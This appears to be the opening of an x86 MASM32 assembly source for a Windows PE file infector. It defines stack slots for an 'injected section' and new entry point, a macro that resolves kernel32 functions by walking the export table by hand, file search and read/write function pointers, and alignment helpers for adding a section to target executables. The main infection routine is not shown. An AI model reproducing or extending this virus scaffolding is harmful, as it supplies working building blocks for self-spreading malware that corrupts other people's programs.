;include \Masm32\include\masm32rt.inc

.386
.model flat, stdcall
option casemap: none
include \masm32\include\windows.inc 
include \masm32\include\kernel32.inc 
includelib \masm32\lib\kernel32.lib 

; .const
	; Order of each variable IN THE STACK
	; Position relative to r|ebp calculated by -(Order * regSz)
    deltaAddr EQU 1
    old_ebp EQU 2
	selfImageBaseAddress EQU 3
	selfSection EQU 4			; VA of injected section
	selfEntry EQU 5				; VA of EntryPoint
	selfVirtualSize EQU 6
	selfPointerToRawData EQU 7
	
	tgHand EQU 8
	tgNewEntry EQU 9
	lfanew EQU 10
	NumberOfSections EQU 11 ; WORD; Before injection
	SizeOfOptionalHeader EQU 12 ; WORD
	ioh_offset EQU 13
	Magic EQU 14 ; WORD; 10Bh => 32=bit; 20Bh => 64-bit
	AddressOfEntryPoint EQU 15
	SectionAlignment EQU 16
	FileAlignment EQU 17
	lastish_offset EQU 18
	newish_offset EQU 19
	
    kernel32dll EQU 20
    OrdinalTbl EQU 21
    NamePtrTbl EQU 22
    AddrTbl EQU 23
    k32NumFunc EQU 24
    user32dll EQU 25
    
	fileHand EQU 26 ; From FindFirstFile, for FindNextFile
    ffind1 EQU 27 		; FindFirstFileA
    ffind2 EQU 28 		; FindNextFileA
    ffind0 EQU 29 		; FindClose
    fopen EQU 30 		; CreateFileA
    fseek EQU 31 		; SetFilePointer(Ex)
    fclose EQU 32 		; CloseHandle
    fread EQU 33 		; ReadFile
    fwrite EQU 34 		; WriteFile
    ferror EQU 36		; GetLastError
    loadlib EQU 37 		; LoadLibraryA
    getaddr EQU 38 		; GetProcAddress
    msgbox EQU 39 		; MessageBoxA
    
    ; Other constants for readability
    stack_reserved EQU 39 ; Number of values to be stored in the stack
    regSz EQU 4 ; 8 for 64-bit
    
    SEEK_SET EQU 0
    SEEK_CUR EQU 1
    SEEK_END EQU 2

stackAddr MACRO pos:REQ
	LOCAL temp
	temp = - pos * regSz
	EXITM <temp>
ENDM

toStack MACRO pos:REQ, value:=<eax>
    mov [ebp + stackAddr(pos)], value
ENDM

fromStack MACRO pos:REQ
	EXITM <[ebp + stackAddr(pos)]>
ENDM

vfromStack MACRO pos:REQ
	EXITM <DWORD PTR [ebp + stackAddr(pos)]>
ENDM


; MACRO for accessing data regions
; selfSection required
; reg is used as a temporary intermediate => has to be unused
; Should NOT be used multiple times within another macro/instruction (e.g. invoke)
daccess MACRO pStr:REQ, reg:=<eax>
	mov reg, pStr - data_start
	add reg, fromStack(selfSection)
	EXITM <reg>
ENDM

; Accessing values in data regions/pointer to data regions
paccess MACRO pStr:REQ, reg:=<eax>
	EXITM <DWORD PTR [daccess(pStr, reg)]>
ENDM

k32import MACRO pFunc:REQ
	; Input the offset to a string that is the name of the queried function
	LOCAL loopback, found
	
	mov ebx, fromStack(kernel32dll)
	mov edx, fromStack(k32NumFunc)
	xor eax, eax
	
	loopback:
		mov edi, fromStack(NamePtrTbl)
		mov edi, [edi + eax*4]
		add edi, ebx
		mov esi, daccess(pFunc, esi)
		xor ecx, ecx
		add ecx, LENGTHOF pFunc
		cld ; DF = 0, ESI and EDI increments
		repe cmpsb
	jz found
	
		inc eax
		cmp eax, edx
	jb loopback
	
	jmp to_exit
	
	found:
	mov edx, fromStack(OrdinalTbl)
	mov ax, [edx + eax * 2]
	mov edx, fromStack(AddrTbl)
	mov eax, [edx + eax * 4]
	mov edx, fromStack(kernel32dll)
	add eax, edx
	; eax now hold mem addr of function pointed to by pFunc
ENDM
	
getval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>, reg:=<eax>
	; handle MUST be obtained from stack beforehand
	; length should not be greater than 4 (32-bit)
	mov paccess(offset tempDword, reg), 0
	
	push whence
	push 0
	push disp
	push handle
	call vfromStack(fseek)
	
	push 0
	push daccess(offset tempDword2, reg)
	push length
	push daccess(offset tempDword, reg)
	push handle
	call vfromStack(fread)
	; Retrieved value is stored in tempDword
ENDM

closest MACRO actual:=<eax>, alignment:=<ebx>
	mov eax, actual
	xor edx, edx
	idiv alignment
	inc eax
	imul eax, alignment
	; Result is stored in eax
ENDM
